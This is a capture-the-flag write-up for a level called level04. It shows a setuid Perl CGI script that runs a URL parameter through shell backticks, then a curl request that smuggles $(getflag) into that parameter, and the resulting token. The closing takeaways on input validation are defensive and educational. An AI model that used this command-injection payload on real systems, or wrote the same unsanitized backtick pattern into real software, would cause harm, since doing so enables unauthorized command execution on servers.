# Level04 Documentation

## Objective
Exploit a vulnerable Perl CGI script to retrieve the token for `level05` via command injection.

## Approach & Tools
- **Technique**: Server-side command injection through URL parameters.
- **Commands**: `curl`.
- **Tools**: Basic web request analysis.

## Step-by-Step Solution
When we login as level04 user we get a file named level04.pl which is a (perl)[https://www.perl.org/] script.
```bash
ls -la /home/user/level04/
```
#### Output:
```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

### 1. Analyze the Perl Script
The script `level04.pl` runs a web server on port `4747`:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
Key Vulnerability: The echo $y command uses unvalidated input from the URL parameter x.
### 2. Exploit Command Injection

Use curl to inject getflag into the x parameter:
```bash
curl 'localhost:4747/?x=$(getflag)'
```
#### Output:

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

### Key Takeaways

* Command Injection: Unsanitized input in system commands is a critical vulnerability.

* CGI Risks: Web scripts using system() or backticks with user input  are prone to exploitation.

* Input Validation: Always sanitize user inputs in web applications.